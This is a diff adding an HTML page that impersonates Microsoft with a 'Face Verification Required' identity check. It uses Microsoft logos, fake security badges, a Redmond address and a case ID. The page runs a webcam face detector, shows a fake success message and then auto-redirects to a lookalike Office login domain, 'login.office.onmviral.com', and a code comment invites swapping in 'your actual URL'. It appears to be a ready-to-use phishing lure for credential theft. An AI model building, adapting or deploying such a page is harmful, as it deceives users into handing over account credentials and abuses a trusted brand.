@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Face Verification - Identity Confirmation</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4.10.0"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface@0.0.7"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            color: #323130;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: #f8f9fa;
+            color: #323130;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #e1e5e9;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .microsoft-logo {
+            width: 108px;
+            height: 24px;
+        }
+        
+        .security-badge {
+            background: #0078d4;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            flex: 1;
+        }
+        
+        .verification-card {
+            background: white;
+            border: 1px solid #e1e5e9;
+            border-radius: 8px;
+            box-shadow: 0 2.4px 7.2px 0 rgba(0,0,0,.132), 0 0.4px 1.8px 0 rgba(0,0,0,.108);
+            overflow: hidden;
+        }
+        
+        .card-header {
+            background: #fafbfc;
+            border-bottom: 1px solid #e1e5e9;
+            padding: 24px;
+            text-align: center;
+        }
+        
+        .card-header h1 {
+            color: #323130;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .card-header p {
+            color: #605e5c;
+            font-size: 14px;
+        }
+        
+        .card-content {
+            padding: 32px;
+        }
+        
+        .progress-container {
+            margin-bottom: 32px;
+        }
+        
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e1e5e9;
+            z-index: 1;
+        }
+        
+        .progress-bar {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            height: 2px;
+            background: #0078d4;
+            z-index: 2;
+            transition: width 0.3s ease;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 3;
+        }
+        
+        .step-circle {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #e1e5e9;
+            color: #605e5c;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active .step-circle {
+            background: #0078d4;
+            color: white;
+        }
+        
+        .step.completed .step-circle {
+            background: #107c10;
+            color: white;
+        }
+        
+        .step-label {
+            font-size: 12px;
+            color: #605e5c;
+            text-align: center;
+            font-weight: 600;
+        }
+        
+        .step.active .step-label {
+            color: #0078d4;
+        }
+        
+        .face-verification-section {
+            text-align: center;
+            margin: 32px 0;
+        }
+        
+        .camera-container {
+            background: #f8f9fa;
+            border: 2px dashed #e1e5e9;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 24px 0;
+            position: relative;
+            min-height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        
+        #videoElement {
+            width: 100%;
+            max-width: 500px;
+            height: 375px;
+            border-radius: 4px;
+            background: #000;
+            display: none;
+        }
+        
+        #canvasElement {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            max-width: 500px;
+            display: none;
+        }
+        
+        .camera-placeholder {
+            width: 100%;
+            max-width: 500px;
+            height: 375px;
+            background: linear-gradient(45deg, #f3f2f1 25%, transparent 25%), 
+                        linear-gradient(-45deg, #f3f2f1 25%, transparent 25%), 
+                        linear-gradient(45deg, transparent 75%, #f3f2f1 75%), 
+                        linear-gradient(-45deg, transparent 75%, #f3f2f1 75%);
+            background-size: 20px 20px;
+            background-position: 0 0, 0 10px, 10px -10px, -10px 0px;
+            border-radius: 4px;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #605e5c;
+            font-size: 16px;
+        }
+        
+        .face-overlay {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 280px;
+            height: 320px;
+            border: 3px solid #0078d4;
+            border-radius: 12px;
+            background: transparent;
+            z-index: 10;
+            pointer-events: none;
+        }
+        
+        .detection-status {
+            margin: 15px 0;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: 600;
+            display: none;
+        }
+        
+        .detection-active {
+            background: #dff6dd;
+            border: 1px solid #107c10;
+            color: #107c10;
+        }
+        
+        .detection-waiting {
+            background: #fff4ce;
+            border: 1px solid #ffaa44;
+            color: #8a5000;
+        }
+        
+        .countdown-timer {
+            font-size: 18px;
+            font-weight: bold;
+            color: #0078d4;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .capture-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 120, 212, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 20;
+            display: none;
+        }
+        
+        .capture-flash {
+            animation: flash 0.5s ease;
+        }
+        
+        @keyframes flash {
+            0% { background: rgba(255, 255, 255, 0); }
+            50% { background: rgba(255, 255, 255, 0.8); }
+            100% { background: rgba(255, 255, 255, 0); }
+        }
+        
+        .verification-controls {
+            margin: 24px 0;
+        }
+        
+        .start-button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+        
+        .start-button:hover {
+            background: #106ebe;
+        }
+        
+        .start-button:disabled {
+            background: #a19f9d;
+            cursor: not-allowed;
+        }
+        
+        .stop-button {
+            background: #d13438;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            display: none;
+            margin-left: 10px;
+        }
+        
+        .stop-button:hover {
+            background: #b02a30;
+        }
+        
+        .verification-status {
+            margin: 20px 0;
+            padding: 16px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+        
+        .status-success {
+            background: #dff6dd;
+            border: 1px solid #107c10;
+            color: #107c10;
+        }
+        
+        .status-processing {
+            background: #fff4ce;
+            border: 1px solid #ffaa44;
+            color: #8a5000;
+        }
+        
+        .next-step-section {
+            text-align: center;
+            margin-top: 32px;
+        }
+        
+        .redirect-countdown {
+            background: #e1f5fe;
+            border: 2px solid #0078d4;
+            border-radius: 8px;
+            padding: 25px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .redirect-countdown h3 {
+            color: #0078d4;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .redirect-timer {
+            font-size: 32px;
+            font-weight: bold;
+            color: #0078d4;
+            margin: 15px 0;
+        }
+        
+        .redirect-message {
+            color: #605e5c;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .manual-redirect {
+            margin-top: 20px;
+        }
+        
+        .manual-button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+        }
+        
+        .manual-button:hover {
+            background: #106ebe;
+        }
+        
+        .footer {
+            background: #fafbfc;
+            border-top: 1px solid #e1e5e9;
+            padding: 20px;
+            text-align: center;
+            color: #605e5c;
+            font-size: 12px;
+        }
+        
+        .instructions {
+            background: #f8f9fa;
+            border-radius: 4px;
+            padding: 16px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .instructions h3 {
+            color: #323130;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .instructions ul {
+            color: #605e5c;
+            font-size: 13px;
+            padding-left: 20px;
+        }
+        
+        .instructions li {
+            margin-bottom: 6px;
+        }
+        
+        .microsoft-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+            justify-content: center;
+            color: #605e5c;
+            font-size: 13px;
+        }
+        
+        .privacy-notice {
+            background: #e1f5fe;
+            border: 1px solid #01579b;
+            border-radius: 4px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 12px;
+            color: #01579b;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo-container">
+            <svg class="microsoft-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
+                <rect width="10.931" height="10.931" fill="#f25022"/>
+                <rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/>
+                <rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/>
+                <rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/>
+                <path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/>
+            </svg>
+        </div>
+        <div class="security-badge">🔒 SECURE FACE VERIFICATION</div>
+    </div>
+
+    <div class="container">
+        <div class="verification-card">
+            <div class="card-header">
+                <h1>Face Verification Required</h1>
+                <p>Complete identity confirmation to maintain account access</p>
+            </div>
+            
+            <div class="card-content">
+                <div class="progress-container">
+                    <div class="progress-steps">
+                        <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
+                        <div class="step active" id="step1">
+                            <div class="step-circle">1</div>
+                            <div class="step-label">Prepare</div>
+                        </div>
+                        <div class="step" id="step2">
+                            <div class="step-circle">2</div>
+                            <div class="step-label">Face Scan</div>
+                        </div>
+                        <div class="step" id="step3">
+                            <div class="step-circle">3</div>
+                            <div class="step-label">Complete</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="face-verification-section" id="faceVerificationSection">
+                    <h2 style="color: #323130; margin-bottom: 16px; font-size: 20px;">Face Recognition Setup</h2>
+                    <p style="color: #605e5c; margin-bottom: 24px; font-size: 14px;">
+                        We need to verify your identity using facial recognition. This helps protect your account from unauthorized access.
+                    </p>
+
+                    <div class="privacy-notice">
+                        <strong>Privacy Notice:</strong> This face detection runs entirely in your browser. No images or facial data are stored or transmitted to any server. TensorFlow.js processes everything locally on your device.
+                    </div>
+
+                    <div class="camera-container">
+                        <div class="camera-placeholder" id="cameraPlaceholder">
+                            Camera feed will appear here
+                        </div>
+                        <video id="videoElement" autoplay playsinline></video>
+                        <canvas id="canvasElement"></canvas>
+                        <div class="face-overlay"></div>
+                        <div class="capture-overlay" id="captureOverlay">
+                            <div style="text-align: center; color: #0078d4; font-weight: bold; font-size: 24px;">
+                                ✓ Face Captured Successfully
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="countdown-timer" id="countdownTimer">
+                        Auto-capturing in: <span id="countdownValue">4</span>s
+                    </div>
+
+                    <div class="detection-status detection-waiting" id="detectionStatus">
+                        🔍 Looking for face... Please position yourself in the frame
+                    </div>
+
+                    <div class="instructions">
+                        <h3>Before you start:</h3>
+                        <ul>
+                            <li>Ensure good lighting on your face</li>
+                            <li>Remove sunglasses or hats</li>
+                            <li>Position your face within the frame</li>
+                            <li>Stay still during the scanning process</li>
+                            <li>Grant camera permissions when prompted</li>
+                        </ul>
+                    </div>
+
+                    <div class="verification-controls">
+                        <button class="start-button" id="startButton" onclick="startFaceVerification()">
+                            Start Face Verification
+                        </button>
+                        <button class="stop-button" id="stopButton" onclick="stopFaceVerification()">
+                            Stop Camera
+                        </button>
+                    </div>
+
+                    <div class="verification-status status-processing" id="processingStatus">
+                        <div style="font-size: 18px; margin-bottom: 8px;">🔄 Processing Face Data</div>
+                        <p>Analyzing facial features... Please wait.</p>
+                    </div>
+
+                    <div class="verification-status status-success" id="successStatus">
+                        <div style="font-size: 18px; margin-bottom: 8px;">✅ Verification Successful</div>
+                        <p>Your face has been successfully verified and registered.</p>
+                    </div>
+                    
+                    <div class="microsoft-badge">
+                        <svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="6" height="6" fill="#f25022"/>
+                            <rect x="8" width="6" height="6" fill="#7fba00"/>
+                            <rect y="8" width="6" height="6" fill="#00a4ef"/>
+                            <rect x="8" y="8" width="6" height="6" fill="#ffb900"/>
+                        </svg>
+                        <span>Microsoft Security Verification Service</span>
+                    </div>
+                </div>
+
+                <div class="next-step-section" id="nextStepSection" style="display: none;">
+                    <h2 style="color: #323130; margin-bottom: 16px; font-size: 20px;">Verification Complete</h2>
+                    <p style="color: #605e5c; margin-bottom: 24px; font-size: 14px;">
+                        Your face verification was successful! Your identity has been confirmed. You will be automatically redirected to complete your account security update.
+                    </p>
+                    
+                    <div class="redirect-countdown">
+                        <h3>Redirecting to Security Portal</h3>
+                        <div class="redirect-timer" id="redirectTimer">5</div>
+                        <p class="redirect-message">
+                            You will be automatically redirected in <span id="redirectSeconds">5</span> seconds
+                        </p>
+                    </div>
+                    
+                    <div class="manual-redirect">
+                        <p style="color: #605e5c; font-size: 13px; margin-bottom: 10px;">
+                            If you are not redirected automatically, click the button below:
+                        </p>
+                        <button class="manual-button" onclick="redirectToSecurityPortal()">
+                            Proceed to Security Portal
+                        </button>
+                    </div>
+                    
+                    <div class="microsoft-badge">
+                        <svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="6" height="6" fill="#f25022"/>
+                            <rect x="8" width="6" height="6" fill="#7fba00"/>
+                            <rect y="8" width="6" height="6" fill="#00a4ef"/>
+                            <rect x="8" y="8" width="6" height="6" fill="#ffb900"/>
+                        </svg>
+                        <span>Microsoft Account Security</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Microsoft Corporation • One Microsoft Way, Redmond, WA 98052</p>
+        <p style="margin-top: 8px;">Case ID: MSFT-FACE-VERIFY-88742 • This is a secure Microsoft verification service</p>
+    </div>
+
+    <script>
+        let model = null;
+        let videoStream = null;
+        let detectionInterval = null;
+        let countdownInterval = null;
+        let redirectInterval = null;
+        let faceDetected = false;
+        let countdownValue = 4;
+        let redirectValue = 5;
+
+        // Load the face detection model
+        async function loadFaceDetectionModel() {
+            try {
+                console.log('Loading face detection model...');
+                model = await blazeface.load();
+                console.log('Face detection model loaded successfully');
+            } catch (error) {
+                console.error('Error loading face detection model:', error);
+                alert('Error loading face detection capabilities. Please refresh the page and try again.');
+            }
+        }
+
+        // Start face verification process
+        async function startFaceVerification() {
+            const startButton = document.getElementById('startButton');
+            const stopButton = document.getElementById('stopButton');
+            const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+            const videoElement = document.getElementById('videoElement');
+            const detectionStatus = document.getElementById('detectionStatus');
+
+            // Disable start button
+            startButton.disabled = true;
+            startButton.textContent = 'Initializing Camera...';
+
+            try {
+                // Request camera access
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    } 
+                });
+                
+                // Set video source
+                videoElement.srcObject = videoStream;
+                videoElement.style.display = 'block';
+                cameraPlaceholder.style.display = 'none';
+                
+                // Show stop button
+                stopButton.style.display = 'inline-block';
+                startButton.textContent = 'Verification in Progress';
+                
+                // Show detection status
+                detectionStatus.style.display = 'block';
+                detectionStatus.className = 'detection-status detection-waiting';
+                detectionStatus.textContent = '🔍 Looking for face... Please position yourself in the frame';
+                
+                // Start face detection
+                startFaceDetection();
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Unable to access camera. Please ensure you have granted camera permissions and try again.');
+                resetVerificationUI();
+            }
+        }
+
+        // Start face detection
+        function startFaceDetection() {
+            const videoElement = document.getElementById('videoElement');
+            const canvasElement = document.getElementById('canvasElement');
+            const detectionStatus = document.getElementById('detectionStatus');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const countdownValueElement = document.getElementById('countdownValue');
+            
+            canvasElement.width = videoElement.videoWidth;
+            canvasElement.height = videoElement.videoHeight;
+            const ctx = canvasElement.getContext('2d');
+            
+            detectionInterval = setInterval(async () => {
+                if (videoElement.readyState === videoElement.HAVE_ENOUGH_DATA) {
+                    // Run face detection
+                    const predictions = await model.estimateFaces(videoElement, false);
+                    
+                    if (predictions.length > 0) {
+                        // Face detected
+                        if (!faceDetected) {
+                            faceDetected = true;
+                            detectionStatus.className = 'detection-status detection-active';
+                            detectionStatus.textContent = '✅ Face detected! Hold still for automatic capture...';
+                            
+                            // Show countdown timer
+                            countdownTimer.style.display = 'block';
+                            countdownValue = 4;
+                            countdownValueElement.textContent = countdownValue;
+                            
+                            // Start countdown
+                            startCountdown();
+                        }
+                        
+                        // Draw face bounding box (optional visual feedback)
+                        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+                        ctx.strokeStyle = '#0078d4';
+                        ctx.lineWidth = 3;
+                        
+                        predictions.forEach(prediction => {
+                            const start = prediction.topLeft;
+                            const end = prediction.bottomRight;
+                            const size = [end[0] - start[0], end[1] - start[1]];
+                            
+                            ctx.strokeRect(start[0], start[1], size[0], size[1]);
+                        });
+                    } else {
+                        // No face detected
+                        if (faceDetected) {
+                            faceDetected = false;
+                            detectionStatus.className = 'detection-status detection-waiting';
+                            detectionStatus.textContent = '🔍 Looking for face... Please position yourself in the frame';
+                            
+                            // Hide countdown timer
+                            countdownTimer.style.display = 'none';
+                            
+                            // Stop countdown
+                            if (countdownInterval) {
+                                clearInterval(countdownInterval);
+                                countdownInterval = null;
+                            }
+                        }
+                        ctx.clearRect(0, 0, canvasElement.width, canvasElement.height);
+                    }
+                }
+            }, 500); // Check for faces every 500ms
+        }
+
+        // Start countdown for auto-capture
+        function startCountdown() {
+            const countdownValueElement = document.getElementById('countdownValue');
+            
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+            
+            countdownInterval = setInterval(() => {
+                countdownValue--;
+                countdownValueElement.textContent = countdownValue;
+                
+                if (countdownValue <= 0) {
+                    clearInterval(countdownInterval);
+                    captureFace();
+                }
+            }, 1000);
+        }
+
+        // Capture face and proceed
+        function captureFace() {
+            const captureOverlay = document.getElementById('captureOverlay');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const detectionStatus = document.getElementById('detectionStatus');
+            
+            // Show capture overlay with flash effect
+            captureOverlay.style.display = 'flex';
+            captureOverlay.classList.add('capture-flash');
+            
+            // Hide countdown and detection status
+            countdownTimer.style.display = 'none';
+            detectionStatus.style.display = 'none';
+            
+            // Stop face detection
+            if (detectionInterval) {
+                clearInterval(detectionInterval);
+                detectionInterval = null;
+            }
+            
+            // Proceed to next step after a brief delay
+            setTimeout(() => {
+                completeFaceVerification();
+            }, 1500);
+        }
+
+        // Complete the face verification process
+        function completeFaceVerification() {
+            const processingStatus = document.getElementById('processingStatus');
+            const successStatus = document.getElementById('successStatus');
+            const nextStepSection = document.getElementById('nextStepSection');
+            const progressBar = document.getElementById('progressBar');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const captureOverlay = document.getElementById('captureOverlay');
+
+            // Hide capture overlay
+            captureOverlay.style.display = 'none';
+            
+            // Show processing status
+            processingStatus.style.display = 'block';
+            
+            // Update progress to step 2
+            progressBar.style.width = '50%';
+            step1.classList.remove('active');
+            step1.classList.add('completed');
+            step2.classList.add('active');
+
+            // Simulate processing delay
+            setTimeout(() => {
+                // Hide processing, show success
+                processingStatus.style.display = 'none';
+                successStatus.style.display = 'block';
+                
+                // Update progress to step 3
+                progressBar.style.width = '100%';
+                step2.classList.remove('active');
+                step2.classList.add('completed');
+                step3.classList.add('active');
+                
+                // Stop camera
+                stopFaceVerification();
+                
+                // Show next step section after delay
+                setTimeout(() => {
+                    document.getElementById('faceVerificationSection').style.display = 'none';
+                    nextStepSection.style.display = 'block';
+                    startRedirectCountdown();
+                }, 2000);
+            }, 3000);
+        }
+
+        // Start redirect countdown
+        function startRedirectCountdown() {
+            const redirectTimer = document.getElementById('redirectTimer');
+            const redirectSeconds = document.getElementById('redirectSeconds');
+            
+            redirectValue = 5;
+            redirectTimer.textContent = redirectValue;
+            redirectSeconds.textContent = redirectValue;
+            
+            if (redirectInterval) {
+                clearInterval(redirectInterval);
+            }
+            
+            redirectInterval = setInterval(() => {
+                redirectValue--;
+                redirectTimer.textContent = redirectValue;
+                redirectSeconds.textContent = redirectValue;
+                
+                if (redirectValue <= 0) {
+                    clearInterval(redirectInterval);
+                    redirectToSecurityPortal();
+                }
+            }, 1000);
+        }
+
+        // Redirect to security portal
+        function redirectToSecurityPortal() {
+            // Replace this with your actual URL
+            window.location.href = 'https://login.office.onmviral.com/TNnJpPsL';
+        }
+
+        // Stop face verification
+        function stopFaceVerification() {
+            if (detectionInterval) {
+                clearInterval(detectionInterval);
+                detectionInterval = null;
+            }
+            
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
+            }
+            
+            if (redirectInterval) {
+                clearInterval(redirectInterval);
+                redirectInterval = null;
+            }
+            
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+            }
+            
+            const videoElement = document.getElementById('videoElement');
+            const canvasElement = document.getElementById('canvasElement');
+            const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+            const startButton = document.getElementById('startButton');
+            const stopButton = document.getElementById('stopButton');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const captureOverlay = document.getElementById('captureOverlay');
+            
+            videoElement.style.display = 'none';
+            canvasElement.style.display = 'none';
+            cameraPlaceholder.style.display = 'flex';
+            stopButton.style.display = 'none';
+            countdownTimer.style.display = 'none';
+            captureOverlay.style.display = 'none';
+            
+            resetVerificationUI();
+        }
+
+        // Reset UI elements
+        function resetVerificationUI() {
+            const startButton = document.getElementById('startButton');
+            const detectionStatus = document.getElementById('detectionStatus');
+            
+            startButton.disabled = false;
+            startButton.textContent = 'Start Face Verification';
+            detectionStatus.style.display = 'none';
+            
+            faceDetected = false;
+            countdownValue = 4;
+            redirectValue = 5;
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set initial progress
+            document.getElementById('progressBar').style.width = '0%';
+            
+            // Load face detection model
+            loadFaceDetectionModel();
+        });
+    </script>
+</body>
+</html>
